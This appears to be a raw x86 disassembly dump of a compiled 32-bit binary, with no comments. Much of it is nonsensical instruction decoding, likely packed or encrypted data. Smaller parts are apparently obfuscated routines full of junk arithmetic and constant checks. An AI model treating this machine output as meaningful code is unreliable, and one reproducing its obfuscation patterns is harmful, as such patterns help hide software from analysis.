  40e58a:	icebp  
  40e58b:	jmp    ebp
  40e58d:	imul   esi,DWORD PTR [esi+0xf],0xffffff82
  40e591:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e592:	hlt    
  40e593:	call   DWORD PTR [esi]
  40e595:	xchg   BYTE PTR [eax-0xbf00377],ah
  40e59b:	push   0x44
  40e59d:	xchg   esi,eax
  40e59e:	sub    DWORD PTR [eax+0x1d],0x21
  40e5a2:	mov    bl,0x40
  40e5a4:	sub    al,0xca
  40e5a6:	push   ebp
  40e5a7:	pushf  
  40e5a8:	adc    ch,BYTE PTR [esi+0x1b]
  40e5ab:	iret   
  40e5ac:	es inc eax
  40e5ae:	gs add al,0xf
  40e5b1:	call   0x291b20af
  40e5b6:	mov    ebx,0xf7bc7f94
  40e5bb:	dec    ebp
  40e5bc:	mov    eax,ds:0x4ae166d8
  40e5c1:	push   ecx
  40e5c2:	dec    esp
  40e5c3:	sbb    eax,0xaae6a298
  40e5c8:	loop   0x40e595
  40e5ca:	xor    esp,DWORD PTR [ebx+0x70]
  40e5cd:	mov    bh,0x5d
  40e5d0:	call   0xbb62:0x4b1ad08
  40e5d7:	outs   dx,BYTE PTR ds:[esi]
  40e5d8:	or     DWORD PTR [edx],ecx
  40e5da:	cmp    ebp,DWORD PTR [ebx-0x10591daf]
  40e5e0:	dec    esi
  40e5e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5e2:	fisttp DWORD PTR [edx]
  40e5e4:	inc    ebx
  40e5e5:	fcom   QWORD PTR [ebp-0x14]
  40e5e8:	add    eax,0xf53610f7
  40e5ed:	or     ecx,DWORD PTR [esi-0x59]
  40e5f0:	mov    edi,0x48265ed0
  40e5f5:	mov    ds:0xdcc8867f,eax
  40e5fa:	test   al,0xdc
  40e5fc:	and    BYTE PTR [edi+ecx*1],cl
  40e5ff:	mov    edi,0x5696cb00
  40e604:	jg     0x40e5ae
  40e606:	sub    al,0x72
  40e608:	push   0xffffffe7
  40e60a:	aas    
  40e60b:	into   
  40e60c:	sbb    BYTE PTR [eax+0x42f7e96c],dl
  40e612:	pop    edi
  40e613:	leave  
  40e614:	inc    edi
  40e615:	sub    edx,DWORD PTR [ebp-0x5c1a0bff]
  40e61b:	xlat   BYTE PTR ds:[ebx]
  40e61c:	loope  0x40e644
  40e61e:	ficomp DWORD PTR [ebx+0x6c]
  40e621:	in     eax,0xfd
  40e623:	in     eax,0x44
  40e625:	mov    esi,DWORD PTR [esi+0x534f5e22]
  40e62b:	icebp  
  40e62c:	jecxz  0x40e5ba
  40e62e:	ja     0x40e642
  40e630:	sub    esp,DWORD PTR [eax+edi*2-0x77]
  40e634:	pushf  
  40e635:	mov    WORD PTR [edi+0x35],gs
  40e638:	fbstp  TBYTE PTR [eax+ecx*4-0x1bc65c19]
  40e63f:	mov    ecx,0xaeb802b0
  40e644:	daa    
  40e645:	ficomp DWORD PTR [edx-0x3248d4e2]
  40e64b:	adc    BYTE PTR [eax],ch
  40e64d:	cmp    al,ah
  40e64f:	xchg   ebx,eax
  40e650:	out    0x45,eax
  40e652:	sbb    BYTE PTR [edi+0x3242aeff],cl
  40e658:	sbb    BYTE PTR [esp+esi*2],dh
  40e65b:	push   ss
  40e65c:	mov    ah,0x3f
  40e65e:	inc    edx
  40e65f:	jge    0x40e607
  40e661:	push   ds
  40e662:	jno    0x40e5ed
  40e664:	stos   BYTE PTR es:[edi],al
  40e665:	arpl   si,cx
  40e667:	push   DWORD PTR [esi]
  40e669:	mov    al,ds:0x4c96231b
  40e66e:	push   0xbdad8637
  40e673:	xor    bh,ch
  40e675:	enter  0xeaeb,0xc6
  40e679:	inc    ebx
  40e67a:	test   al,0x5e
  40e67c:	lds    ebp,FWORD PTR [edx]
  40e67e:	and    BYTE PTR [ebp+0x443fe71e],al
  40e684:	in     eax,dx
  40e685:	hlt    
  40e686:	xchg   esp,eax
  40e687:	pop    edi
  40e688:	inc    ebp
  40e689:	inc    edx
  40e68a:	out    0x4a,eax
  40e68c:	mov    eax,ds:0xd6b260c0
  40e691:	pop    ss
  40e692:	(bad)  
  40e693:	cmp    bl,BYTE PTR [edx+0x36]
  40e696:	cmp    DWORD PTR [edx-0x3594767a],ebp
  40e69c:	jno    0x40e66e
  40e69e:	leave  
  40e69f:	icebp  
  40e6a0:	adc    DWORD PTR [esi+eax*8+0x72],esi
  40e6a4:	xor    al,0x7d
  40e6a6:	mov    eax,fs
  40e6a8:	bsf    ecx,DWORD PTR [ebp-0x682d2bbe]
  40e6af:	sub    edi,edx
  40e6b1:	jge    0x40e6d4
  40e6b3:	inc    edi
  40e6b4:	cmc    
  40e6b5:	jmp    0x40e701
  40e6b7:	data16 mov ds:0xf041f56,al
  40e6bd:	add    DWORD PTR [edi],esp
  40e6bf:	cmp    al,0xd7
  40e6c1:	lea    ecx,[esi-0x8289361]
  40e6c7:	ret    0x5166
  40e6ca:	cdq    
  40e6cb:	xchg   edx,eax
  40e6cc:	mov    ecx,0xdef40628
  40e6d1:	dec    edx
  40e6d2:	ja     0x40e6a8
  40e6d4:	icebp  
  40e6d5:	ja     0x40e723
  40e6d7:	test   eax,0x5eb61713
  40e6dc:	mov    bh,0xd4
  40e6de:	mov    WORD PTR [ebx-0x3f4e2ab9],es
  40e6e4:	xchg   esp,eax
  40e6e5:	mov    ah,bl
  40e6e7:	mov    ebx,0xa6d6f64f
  40e6ec:	xor    ecx,ebp
  40e6ee:	jo     0x40e738
  40e6f0:	stos   DWORD PTR es:[edi],eax
  40e6f1:	ror    BYTE PTR [esi],1
  40e6f3:	fdiv   QWORD PTR [ebx-0x70]
  40e6f6:	dec    eax
  40e6f7:	sub    al,0x20
  40e6f9:	mov    ebx,0x7ab0ec1
  40e6fe:	je     0x40e73a
  40e700:	ins    DWORD PTR es:[edi],dx
  40e701:	outs   dx,DWORD PTR ds:[esi]
  40e702:	sub    edi,ebx
  40e704:	or     eax,DWORD PTR [ecx+edi*2+0x5c3acb3b]
  40e70b:	mov    ds:0xa9ac607,eax
  40e710:	jl     0x40e760
  40e712:	push   ebx
  40e713:	or     al,BYTE PTR [esi-0x6f]
  40e716:	sub    DWORD PTR [edx+edi*4],esi
  40e719:	adc    eax,0xc35a624a
  40e71e:	inc    ebp
  40e71f:	or     bl,BYTE PTR [eax-0x24]
  40e722:	outs   dx,BYTE PTR ds:[esi]
  40e723:	pop    ebx
  40e724:	add    ecx,DWORD PTR [esi-0x76]
  40e727:	shr    cl,1
  40e729:	loop   0x40e6cf
  40e72b:	push   ebx
  40e72c:	push   ebp
  40e72d:	add    bh,BYTE PTR [eax]
  40e72f:	mov    edi,ebp
  40e731:	cmp    edx,eax
  40e733:	jae    0x40e717
  40e735:	bound  edx,QWORD PTR [esi]
  40e737:	icebp  
  40e738:	mov    bl,0x1d
  40e73a:	iret   
  40e73b:	cmp    dh,ah
  40e73d:	jg     0x40e6fa
  40e73f:	cmp    eax,0x3d32b9d8
  40e744:	jmp    0x5f4fe363
  40e749:	xor    al,0x3d
  40e74b:	adc    bh,BYTE PTR [ecx+0x9]
  40e74e:	cmp    bl,BYTE PTR [esi]
  40e750:	retf   0xe3db
  40e753:	pop    esp
  40e754:	(bad)  
  40e756:	mov    ecx,DWORD PTR ds:0x98037837
  40e75c:	sub    esp,ebp
  40e75e:	lods   al,BYTE PTR ds:[esi]
  40e75f:	xor    al,0x64
  40e761:	mov    dl,0x38
  40e763:	outs   dx,BYTE PTR ds:[esi]
  40e764:	sub    al,0xa8
  40e766:	loope  0x40e701
  40e768:	shl    eax,cl
  40e76a:	pop    ds
  40e76b:	mov    ds:0xdad4a6e4,eax
  40e770:	xchg   ecx,eax
  40e771:	and    al,BYTE PTR [esi+ecx*2]
  40e774:	mov    bh,0xe5
  40e776:	leave  
  40e777:	mov    WORD PTR [eax],?
  40e779:	daa    
  40e77a:	mov    dh,0x52
  40e77c:	(bad)  
  40e77d:	sahf   
  40e77e:	mov    dl,0xd1
  40e780:	test   cl,dl
  40e782:	pop    esi
  40e783:	mov    eax,DWORD PTR [edi-0x80]
  40e786:	inc    ecx
  40e787:	mov    edi,0xfa8a58bc
  40e78c:	lea    edi,[ebx+0xcae9e04]
  40e792:	(bad)  
  40e793:	addr16 push 0xd9349534
  40e799:	out    dx,al
  40e79a:	cmp    eax,0x7b14fd01
  40e79f:	mov    ds:0x389a643f,al
  40e7a4:	adc    eax,0x7eda4eb1
  40e7a9:	outs   dx,BYTE PTR ds:[esi]
  40e7aa:	lds    ebx,FWORD PTR [esi+eiz*1-0x27]
  40e7ae:	stos   DWORD PTR es:[edi],eax
  40e7af:	or     al,0xd3
  40e7b1:	cli    
  40e7b2:	jmp    0x40e7f8
  40e7b4:	and    BYTE PTR [edx-0x497b06d2],ch
  40e7ba:	into   
  40e7bb:	pop    edi
  40e7bc:	adc    ch,BYTE PTR [edx+0x1efbbe]
  40e7c2:	mov    eax,0x43d2
  40e7c7:	sub    eax,ecx
  40e7c9:	add    eax,DWORD PTR [ebp+0xc]
  40e7cc:	xor    edx,edx
  40e7ce:	add    eax,DWORD PTR [ebp-0x14]
  40e7d1:	mov    ecx,DWORD PTR [ebp-0xc]
  40e7d4:	div    ecx
  40e7d6:	mov    ecx,DWORD PTR [ebp+0x10]
  40e7d9:	xor    edx,edx
  40e7db:	pop    edi
  40e7dc:	pop    ebx
  40e7dd:	or     eax,0x67ad
  40e7e2:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  40e7e9:	mov    DWORD PTR [ebp+0x10],0x517b
  40e7f0:	mov    DWORD PTR [ebp+0xc],0x5d62
  40e7f7:	mov    DWORD PTR [ebp+0x8],0x41b0
  40e7fe:	mov    ecx,DWORD PTR [ebp+0x8]
  40e801:	mov    eax,DWORD PTR [ebp+0xc]
  40e804:	and    ecx,0x68c1
  40e80a:	sub    ecx,0x6fd3
  40e810:	or     ecx,eax
  40e812:	mov    eax,DWORD PTR [ebp+0x10]
  40e815:	imul   ecx,eax
  40e818:	mov    eax,0xf52840d5
  40e81d:	div    ecx
  40e81f:	leave  
  40e820:	ret    0xc
  40e823:	push   ebp
  40e824:	mov    ebp,esp
  40e826:	sub    esp,0xc0
  40e82c:	push   esi
  40e82d:	mov    DWORD PTR [ebp-0x80],0x2f93
  40e834:	mov    DWORD PTR [ebp-0x7c],0x3321
  40e83b:	mov    DWORD PTR [ebp-0x70],0x7d00
  40e842:	mov    DWORD PTR [ebp-0x6c],0xd87
  40e849:	jmp    0x40eb8c
  40e84e:	xor    dl,BYTE PTR [ecx]
  40e850:	sub    al,0x76
  40e852:	sub    al,0x78
  40e854:	mov    ah,0x99
  40e856:	sahf   
  40e857:	mov    ?,WORD PTR [eax-0x47649c31]
  40e85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e85e:	stos   BYTE PTR es:[edi],al
  40e85f:	or     bh,BYTE PTR [esi-0x413bfe42]
  40e865:	mov    esi,0x91a40180
  40e86a:	scas   al,BYTE PTR es:[edi]
  40e86b:	fs test cl,dl
  40e86e:	or     ah,BYTE PTR [ecx+0x8]
  40e871:	inc    edi
  40e872:	push   cs
  40e873:	aad    0x37
  40e875:	(bad)  
  40e877:	cld    
  40e878:	sbb    ch,ah
  40e87a:	mov    al,ds:0x12094886
  40e87f:	push   es
  40e880:	cli    
  40e881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e882:	das    
  40e883:	addr16 push edi
  40e885:	xchg   edi,eax
  40e886:	dec    esi
  40e887:	lahf   
  40e888:	in     al,dx
  40e889:	outs   dx,DWORD PTR ds:[esi]
  40e88a:	dec    edx
  40e88b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e88c:	retf   
  40e88d:	call   0x5e00:0xb9d5ef03
  40e894:	fsubr  DWORD PTR [ecx]
  40e896:	dec    edi
  40e897:	or     BYTE PTR [ebp-0x13937b1b],al
  40e89d:	add    ecx,edi
  40e89f:	jge    0x40e85f
  40e8a1:	lahf   
  40e8a2:	adc    DWORD PTR [esi],edi
  40e8a4:	sub    DWORD PTR [esi],edx
  40e8a6:	pop    DWORD PTR [ebx-0x38026feb]
  40e8ac:	mov    ebp,0xb86175c3
  40e8b1:	iret   
  40e8b2:	xchg   esi,eax
  40e8b3:	xchg   ebp,eax
  40e8b4:	jl     0x40e859
  40e8b6:	adc    bh,BYTE PTR [ebx-0x6]
  40e8b9:	sub    bh,BYTE PTR [edi+0x60c6f7b]
  40e8bf:	cmp    BYTE PTR [ecx-0x14],al
  40e8c2:	jno    0x40e934
  40e8c4:	sti    
  40e8c5:	popa   
  40e8c6:	sub    esi,edi
  40e8c8:	push   ss
  40e8c9:	mov    edx,DWORD PTR [eax-0x3876f59c]
  40e8cf:	arpl   WORD PTR [esp+eax*8-0x49aef54],sp
  40e8d6:	std    
  40e8d7:	dec    ecx
  40e8d8:	and    dl,bh
  40e8da:	and    al,0x7c
  40e8dc:	js     0x40e873
  40e8de:	add    ecx,DWORD PTR [eax+edi*2+0x7219aa7a]
  40e8e5:	xlat   BYTE PTR ds:[ebx]
  40e8e6:	out    0x99,al
  40e8e8:	pop    esi
  40e8e9:	shl    BYTE PTR [edi],cl
  40e8eb:	icebp  
  40e8ec:	mov    al,0xc4
  40e8ee:	jl     0x40e92e
  40e8f0:	fcmovu st,st(4)
  40e8f2:	dec    esi
  40e8f3:	push   esi
  40e8f4:	(bad)  
  40e8f6:	push   es
  40e8f7:	in     eax,0x44
  40e8f9:	popf   
  40e8fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8fb:	add    bl,cl
  40e8fd:	add    ah,BYTE PTR [edx]
  40e8ff:	popf   
  40e900:	and    dl,BYTE PTR [edi-0x3735569d]
  40e906:	inc    esp
  40e907:	cmc    
  40e908:	cwde   
  40e909:	cmp    eax,0xba8d3886
  40e90e:	out    0x1a,eax
  40e910:	stos   DWORD PTR es:[edi],eax
  40e911:	int    0xa6
  40e913:	popa   
  40e914:	pop    ebp
  40e915:	add    eax,0xfdc0a7d0
  40e91a:	fmul   st(7),st
  40e91c:	xchg   ebp,eax
  40e91d:	adc    DWORD PTR [edi-0x3e24fb1c],ebx
  40e923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e924:	sbb    ah,dl
  40e926:	sbb    al,0x36
  40e928:	aad    0x50
  40e92a:	pop    esi
  40e92b:	or     BYTE PTR [edx],bh
  40e92d:	pop    eax
  40e92e:	xor    ch,ah
  40e930:	mov    eax,ds:0x6f9b1aa5
  40e935:	mov    ebx,0xfcd99cd4
  40e93a:	or     eax,0x7042a9df
  40e93f:	add    al,0x56
  40e941:	cli    
  40e942:	cmp    bl,BYTE PTR [edi+0x3]
  40e945:	push   0x21
  40e947:	idiv   esi
  40e949:	loope  0x40e933
  40e94b:	mov    bl,0x5e
  40e94d:	fs stos DWORD PTR es:[edi],eax
  40e94f:	repz push edx
  40e951:	loope  0x40e914
  40e953:	xor    al,0xfa
  40e955:	and    al,0x29
  40e957:	pop    ebx
  40e958:	dec    edi
  40e959:	stos   BYTE PTR es:[edi],al
  40e95a:	sahf   
  40e95b:	jne    0x40e926
  40e95d:	cwde   
  40e95e:	lods   eax,DWORD PTR ds:[esi]
  40e95f:	sbb    BYTE PTR [edi-0x2734390e],al
  40e965:	sar    DWORD PTR [ebx+0x66eac644],0xef
  40e96c:	adc    DWORD PTR [edi+0x5d070ced],esp
  40e972:	adc    DWORD PTR [ecx+0x4b],ebx
  40e975:	pop    ebp
  40e976:	push   DWORD PTR [ebp+0x1f]
  40e979:	in     al,0x65
  40e97b:	mov    eax,ecx
  40e97d:	ins    BYTE PTR es:[edi],dx
  40e97e:	call   0xc256:0x29015f0a
  40e985:	or     eax,0xab4f0802
  40e98a:	mov    esp,DWORD PTR [esi]
  40e98c:	into   
  40e98d:	repnz and ecx,DWORD PTR [ebp+0x58]
  40e991:	arpl   WORD PTR [eax+0x7a],di
  40e994:	jmp    0x9f55db0b
  40e999:	push   ds
  40e99a:	arpl   WORD PTR [ecx-0x3b],bp
  40e99d:	ins    DWORD PTR es:[edi],dx
  40e99e:	and    eax,0x38a3870a
  40e9a3:	pop    ebp
  40e9a4:	push   ebx
  40e9a5:	mov    ds:0xc29ce8f6,eax
  40e9aa:	mov    ebx,0xef956c23
  40e9af:	pop    ebp
  40e9b0:	int3   
  40e9b1:	arpl   WORD PTR [edx-0x19],bx
  40e9b4:	std    
  40e9b5:	xchg   ecx,eax
  40e9b6:	ds in  al,0x76
  40e9b9:	bnd js 0x40ea00
  40e9bc:	xchg   edi,eax
  40e9bd:	ficom  WORD PTR [edi-0x39]
  40e9c0:	push   eax
  40e9c1:	aam    0x91
  40e9c3:	cli    
  40e9c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9c5:	int3   
  40e9c6:	fwait
  40e9c7:	xchg   ebp,eax
  40e9c8:	jl     0x40e9f4
  40e9ca:	jns    0x40e982
  40e9cc:	repz test edi,ebp
  40e9cf:	aaa    
  40e9d0:	and    al,BYTE PTR [edx+0x53d88411]
  40e9d6:	shl    DWORD PTR [eax],1
  40e9d8:	jo     0x40ea2c
  40e9da:	or     al,0x79
  40e9dc:	in     eax,0x62
  40e9de:	outs   dx,DWORD PTR ds:[esi]
  40e9df:	jle    0x40e9f6
  40e9e1:	nop
  40e9e2:	sub    al,BYTE PTR [ebx-0xf103b6f]
  40e9e8:	popf   
  40e9e9:	out    0x68,eax
  40e9eb:	ins    DWORD PTR es:[edi],dx
  40e9ec:	xor    BYTE PTR [edx+0x40],ah
  40e9ef:	bound  edi,QWORD PTR [edi+0x348318b7]
  40e9f5:	xchg   edi,eax
  40e9f6:	push   ecx
  40e9f7:	cmp    ch,BYTE PTR [edx+0x35a79b20]
  40e9fd:	xor    dl,BYTE PTR [esi]
  40e9ff:	rol    al,0xb6
  40ea02:	stos   DWORD PTR es:[edi],eax
  40ea03:	repz or eax,0x8e55b6d2
  40ea09:	or     bl,cl
  40ea0b:	cld    
  40ea0c:	outs   dx,DWORD PTR ds:[esi]
  40ea0d:	jle    0x40e9c1
  40ea0f:	xlat   BYTE PTR ds:[ebx]
  40ea10:	pop    ebp
  40ea11:	imul   esi,eax,0xaeb4a550
  40ea17:	sti    
  40ea18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea19:	or     eax,DWORD PTR [ebx+0x16076dda]
  40ea1f:	dec    esp
  40ea20:	dec    esp
  40ea21:	xchg   esp,eax
  40ea22:	jns    0x40ea1d
  40ea24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea25:	push   eax
  40ea26:	mov    ecx,0xf531a14c
  40ea2b:	sub    esi,DWORD PTR [eax]
  40ea2d:	inc    ebx
  40ea2e:	jnp    0x40e9db
  40ea30:	xchg   ebx,ecx
  40ea32:	mov    esp,0x168ee790
  40ea37:	aam    0xb
  40ea39:	add    eax,0x2e3fda53
  40ea3e:	mov    BYTE PTR [edi+0x8],cl
  40ea41:	test   ch,bl
  40ea43:	pop    es
  40ea44:	lods   al,BYTE PTR ds:[esi]
  40ea45:	sub    esp,ecx
  40ea47:	sbb    eax,0x622673d8
  40ea4c:	hlt    
  40ea4d:	das    
  40ea4e:	(bad)  
  40ea4f:	cdq    
  40ea50:	mov    edi,0xbb33f21c
  40ea55:	mov    DWORD PTR [edi+0x4d],edx
  40ea58:	mov    ch,ah
  40ea5a:	pop    esp
  40ea5b:	jmp    0x9693:0xc7f8fae5
  40ea62:	jno    0x40ea23
  40ea64:	xor    BYTE PTR [edi-0x3ce43a46],dl
  40ea6a:	and    BYTE PTR [ecx-0x6ac7bff7],ah
  40ea70:	pop    edx
  40ea71:	call   0x709d:0x1a26b0bb
  40ea78:	into   
  40ea79:	adc    dh,BYTE PTR [edx-0x5d]
  40ea7c:	push   ecx
  40ea7d:	xchg   esp,eax
  40ea7e:	rcl    DWORD PTR [ecx+0x5b376501],0x5b
  40ea85:	sahf   
  40ea86:	adc    eax,0xef6b7e84
  40ea8b:	inc    ebp
  40ea8c:	xchg   edi,eax
  40ea8d:	rcl    DWORD PTR [ebp+eax*4-0x5c885648],1
  40ea94:	xor    eax,0x28ee7ae1
  40ea99:	sbb    edx,edi
  40ea9b:	add    bl,al
  40ea9d:	dec    di
  40ea9f:	sbb    esi,ecx
  40eaa1:	push   0x1fcd642d
  40eaa6:	jo     0x40eb0b
  40eaa8:	dec    esi
  40eaa9:	pop    es
  40eaaa:	in     eax,0xc7
  40eaac:	or     eax,0x487b7ee5
  40eab1:	loope  0x40eb2f
  40eab3:	(bad)  
  40eab4:	out    dx,al
  40eab5:	fwait
  40eab6:	dec    eax
  40eab7:	cmc    
  40eab8:	pop    ecx
  40eab9:	pushf  
  40eaba:	adc    BYTE PTR [esi+0x30],0xe5
  40eabe:	(bad)  
  40eac0:	jg     0x40ea5f
  40eac2:	(bad)  
  40eac3:	jbe    0x40ea76
  40eac5:	adc    ah,BYTE PTR [esp+edi*4-0x1bcdc7b0]
  40eacc:	jecxz  0x40eb2a
  40eace:	mov    ds,ebp
  40ead0:	arpl   sp,ax
  40ead2:	cld    
  40ead3:	pusha  
  40ead4:	jmp    0x1fa8bad6
  40ead9:	loopne 0x40ea6c
  40eadb:	(bad)  
  40eadc:	pop    edx
  40eadd:	add    edi,esi
  40eadf:	and    esi,DWORD PTR [ebp-0x61772e7c]
  40eae5:	xor    ah,BYTE PTR [ecx-0x4f]
  40eae8:	push   es
  40eae9:	lods   al,BYTE PTR ds:[esi]
  40eaea:	shl    dh,1
  40eaec:	retf   
  40eaed:	xchg   ebp,eax
  40eaee:	data16 xlat BYTE PTR ds:[ebx]
  40eaf0:	clc    
  40eaf1:	fbld   TBYTE PTR [edi]
  40eaf3:	addr16 pop esi
  40eaf5:	jns    0x40eb01
  40eaf7:	int3   
  40eaf8:	sub    al,0x93
  40eafa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eafb:	ret    
  40eafc:	xchg   ebp,eax
  40eafd:	mov    BYTE PTR [ebp-0x3a2dbaaa],bl
  40eb03:	add    dl,BYTE PTR [ecx]
  40eb05:	mov    ebp,0xc589cd46
  40eb0a:	sub    BYTE PTR [edi-0x5ed27bd4],dh
  40eb10:	rcl    ecx,0xa0
  40eb13:	or     eax,0x734fb98f
  40eb18:	sub    bh,bh
  40eb1a:	pop    es
  40eb1b:	push   es
  40eb1c:	sub    al,0xef
  40eb1e:	inc    edi
  40eb1f:	jmp    0x8e8792a
  40eb24:	inc    eax
  40eb25:	sub    eax,0xc5a1dc1c
  40eb2a:	(bad)  
  40eb2b:	dec    edi
  40eb2c:	outs   dx,DWORD PTR ds:[esi]
  40eb2d:	mov    ss,ecx
  40eb2f:	sub    al,0x1b
  40eb31:	xor    BYTE PTR [esi+0x4c],dl
  40eb34:	int3   
  40eb35:	sar    BYTE PTR [eax],cl
  40eb37:	jno    0x40eb73
  40eb39:	retf   0x165e
  40eb3c:	adc    edi,eax
  40eb3e:	mov    ch,0x31
  40eb40:	cmp    eax,0x95ae8dd2
  40eb45:	mov    eax,ds:0x1de2b058
  40eb4a:	addr16 daa 
  40eb4c:	inc    esi
  40eb4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb4e:	call   DWORD PTR [edx]
  40eb50:	mov    bh,0x97
  40eb52:	sub    DWORD PTR [eax],edi
  40eb54:	adc    edi,edx
  40eb56:	jp     0x40eb10
  40eb58:	inc    eax
  40eb59:	or     BYTE PTR [edi+esi*4],ch
  40eb5c:	sbb    esi,DWORD PTR [esp+edx*8-0x5b]
  40eb60:	scas   eax,DWORD PTR es:[edi]
  40eb61:	add    eax,0x426cc41c
  40eb66:	xor    al,0xcf
  40eb69:	repz fnstcw WORD PTR [edi-0x38ad492b]
  40eb70:	xor    dl,al
  40eb72:	jle    0x40ebf3
  40eb74:	shl    DWORD PTR [edx],cl
  40eb76:	mov    ah,0xe3
  40eb78:	add    DWORD PTR [edi],edi
  40eb7a:	jnp    0x40ebb3
  40eb7c:	aas    
  40eb7d:	mov    WORD PTR [esi],?
  40eb7f:	xchg   DWORD PTR [ebx+0xb],ebp
  40eb82:	scas   eax,DWORD PTR es:[edi]
  40eb83:	xchg   DWORD PTR [edi+0x23],esi
  40eb86:	ins    DWORD PTR es:[edi],dx
  40eb87:	and    BYTE PTR [esp+ebx*4+0x45c79bc6],bl
  40eb8e:	mov    al,ds:0x4197
  40eb93:	mov    DWORD PTR [ebp-0x5c],0xa7d
  40eb9a:	mov    DWORD PTR [ebp-0x50],0x772d
  40eba1:	mov    DWORD PTR [ebp-0x4c],0x37d8
  40eba8:	mov    DWORD PTR [ebp-0x40],0x414a
  40ebaf:	mov    DWORD PTR [ebp-0x3c],0x55ef
  40ebb6:	mov    DWORD PTR [ebp-0x30],0x136b
  40ebbd:	mov    DWORD PTR [ebp-0x2c],0x53e4
  40ebc4:	mov    DWORD PTR [ebp-0x20],0x32d8
  40ebcb:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  40ebd2:	mov    DWORD PTR [ebp-0xc],0x3956
  40ebd9:	mov    DWORD PTR [ebp-0xa4],0x4e57
  40ebe3:	mov    DWORD PTR [ebp-0x94],0x1
  40ebed:	mov    DWORD PTR [ebp-0x14],0x17ab
  40ebf4:	mov    DWORD PTR [ebp-0x64],0x7a3d
  40ebfb:	mov    DWORD PTR [ebp-0x54],0x378a
  40ec02:	mov    DWORD PTR [ebp-0x74],0x5a00
  40ec09:	mov    DWORD PTR [ebp-0x24],0x1f3a
  40ec10:	mov    DWORD PTR [ebp-0x84],0x9a225
  40ec1a:	mov    DWORD PTR [ebp-0x44],0x31f8
  40ec21:	mov    DWORD PTR [ebp-0x34],0x3663
  40ec28:	mov    DWORD PTR [ebp-0xb4],0x3165
  40ec32:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  40ec3c:	mov    DWORD PTR [ebp-0xbc],0x43cc
  40ec46:	mov    DWORD PTR [ebp-0xb0],0x7564
  40ec50:	mov    DWORD PTR [ebp-0xac],0x18cf
  40ec5a:	mov    DWORD PTR [ebp-0xa0],0x3135
  40ec64:	mov    DWORD PTR [ebp-0x9c],0x568d
  40ec6e:	mov    DWORD PTR [ebp-0x90],0x11f2
  40ec78:	mov    DWORD PTR [ebp-0x8c],0x63ea
  40ec82:	mov    DWORD PTR [ebp-0x10],0x3066
  40ec89:	mov    DWORD PTR [ebp-0x8],0x6ed2
  40ec90:	push   0x7e1d
  40ec95:	mov    DWORD PTR [ebp-0x4],0x30f4
  40ec9c:	mov    eax,DWORD PTR [ebp-0x20]
  40ec9f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40eca2:	push   0x5380
  40eca7:	push   ecx
  40eca8:	push   eax
  40eca9:	call   0x41594e
  40ecae:	mov    ecx,eax
  40ecb0:	mov    eax,DWORD PTR [ebp-0x30]
  40ecb3:	xor    ecx,eax
  40ecb5:	mov    esi,edx
  40ecb7:	mov    edx,DWORD PTR [ebp-0x2c]
  40ecba:	mov    eax,DWORD PTR [ebp-0x40]
  40ecbd:	xor    esi,edx
  40ecbf:	mov    edx,DWORD PTR [ebp-0x3c]
  40ecc2:	xor    ecx,0xf3a
  40ecc8:	or     ecx,eax
  40ecca:	mov    eax,ds:0x4226a8
  40eccf:	mov    eax,DWORD PTR [eax+0x1d8]
  40ecd5:	mov    eax,DWORD PTR [eax]
  40ecd7:	xor    esi,0x6665
  40ecdd:	or     esi,edx
  40ecdf:	add    ecx,0xef6a96a5
  40ece5:	cdq    
  40ece6:	adc    esi,0xc8b6a000
  40ecec:	cmp    eax,ecx
  40ecee:	jne    0x40ecfc
  40ecf4:	cmp    edx,esi
  40ecf6:	je     0x40ed5b
  40ecfc:	mov    eax,DWORD PTR [ebp-0x50]
  40ecff:	mov    ecx,DWORD PTR [ebp-0x4c]
  40ed02:	mov    edx,DWORD PTR [ebp-0x60]
  40ed05:	mov    esi,DWORD PTR [ebp-0x5c]
  40ed08:	add    eax,0x7818
  40ed0d:	adc    ecx,0x87
  40ed13:	or     eax,edx
  40ed15:	mov    edx,DWORD PTR [ebp-0x70]
  40ed18:	or     ecx,esi
  40ed1a:	mov    esi,DWORD PTR [ebp-0x6c]
  40ed1d:	push   esi
  40ed1e:	push   edx
  40ed1f:	push   ecx
  40ed20:	push   eax
  40ed21:	call   0x41594e
  40ed26:	mov    ecx,DWORD PTR [ebp-0x80]
  40ed29:	mov    esi,DWORD PTR [ebp-0x7c]
  40ed2c:	and    eax,ecx
  40ed2e:	mov    ecx,DWORD PTR ds:0x4226a8
  40ed34:	mov    ecx,DWORD PTR [ecx+0x1d0]
  40ed3a:	mov    ecx,DWORD PTR [ecx]
  40ed3c:	and    edx,esi
  40ed3e:	xor    eax,0x2b01
  40ed43:	xor    edx,0x2021
  40ed49:	xor    esi,esi
  40ed4b:	cmp    ecx,eax
  40ed4d:	jne    0x40f1dc
  40ed53:	cmp    esi,edx
  40ed55:	jne    0x40f1dc
  40ed5b:	mov    eax,DWORD PTR [ebp-0xa4]
  40ed61:	mov    ecx,DWORD PTR [ebp-0xc]
  40ed64:	add    eax,0x80ca
  40ed69:	or     eax,ecx
  40ed6b:	mov    ecx,DWORD PTR ds:0x422744
  40ed71:	or     eax,0x686
  40ed76:	xor    eax,0x3eec
  40ed7b:	lea    eax,[eax+ecx*1-0xc11b]
  40ed82:	xor    DWORD PTR ds:0x42273c,eax
  40ed88:	mov    eax,DWORD PTR [ebp-0x64]
  40ed8b:	and    eax,0x4dff
  40ed90:	add    eax,DWORD PTR [ebp-0x14]
  40ed93:	mov    ecx,DWORD PTR [ebp-0x94]
  40ed99:	xor    eax,0x676c
  40ed9e:	xor    edx,edx
  40eda0:	div    ecx
